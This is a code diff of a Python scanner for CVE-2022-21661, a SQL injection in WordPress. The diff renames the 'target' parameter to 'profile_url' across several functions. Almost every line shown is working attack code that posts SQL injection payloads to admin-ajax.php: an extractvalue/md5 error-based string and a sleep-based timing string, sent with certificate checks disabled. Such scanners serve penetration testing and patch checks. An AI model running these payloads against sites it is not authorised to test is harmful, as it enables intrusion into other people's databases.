@@ -7,13 +7,13 @@ from urllib.parse import urlparse
 
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-def check_admin_ajax_availability(target):
+def check_admin_ajax_availability(profile_url):
     """
     Check if the 'admin-ajax.php' file is accessible and returns expected status.
     """
     print("[•] Checking for the availability of 'admin-ajax.php' endpoint...")
     try:
-        response = requests.get(f'{target}/wp-admin/admin-ajax.php', 
+        response = requests.get(f'{profile_url}/wp-admin/admin-ajax.php', 
                                 headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
         if response.status_code == 400 and '0' in response.text:
             print("[•] 'admin-ajax.php' endpoint is available and responding as expected.")
@@ -25,7 +25,7 @@ def check_admin_ajax_availability(target):
         print(f"[•] Error accessing 'admin-ajax.php': {e}")
         return False
 
-def test_md5_injection(target):
+def test_md5_injection(profile_url):
     """
     Attempt to exploit using MD5 hash-based SQL injection.
     """
@@ -34,7 +34,7 @@ def test_md5_injection(target):
     data = '{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) and extractvalue(rand(),concat(0x5e,md5(' + str(rand_num) + '),0x5e))#"]}}}'
     
     try:
-        response = requests.post(f'{target}/wp-admin/admin-ajax.php', 
+        response = requests.post(f'{profile_url}/wp-admin/admin-ajax.php', 
                                  data={"action":"test", "data":data},
                                  headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
         
@@ -48,7 +48,7 @@ def test_md5_injection(target):
         print(f"[•] Error during MD5 hash injection: {e}")
         return False
 
-def test_time_based_injection(target):
+def test_time_based_injection(profile_url):
     """
     Attempt to exploit using time-based SQL injection.
     """
@@ -56,7 +56,7 @@ def test_time_based_injection(target):
     data = '{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) or (select sleep(5))#"]}}}'
     
     try:
-        response = requests.post(f'{target}/wp-admin/admin-ajax.php', 
+        response = requests.post(f'{profile_url}/wp-admin/admin-ajax.php', 
                                  data={"action":"test", "data":data},
                                  headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
         
@@ -70,12 +70,12 @@ def test_time_based_injection(target):
         print(f"[•] Error during time-based injection: {e}")
         return False
 
-def scan_cve_2022_21661(target):
-    if not check_admin_ajax_availability(target):
+def scan_cve_2022_21661(profile_url):
+    if not check_admin_ajax_availability(profile_url):
         print("[•] Skipping further tests due to inaccessible admin-ajax.php")
         return "admin-ajax.php not accessible"
-    if test_md5_injection(target):
+    if test_md5_injection(profile_url):
         return "Target is vulnerable to MD5-based SQL injection"
-    if test_time_based_injection(target):
+    if test_time_based_injection(profile_url):
         return "Target is vulnerable to time-based SQL injection"
     return "No SQL injection vulnerability detected"
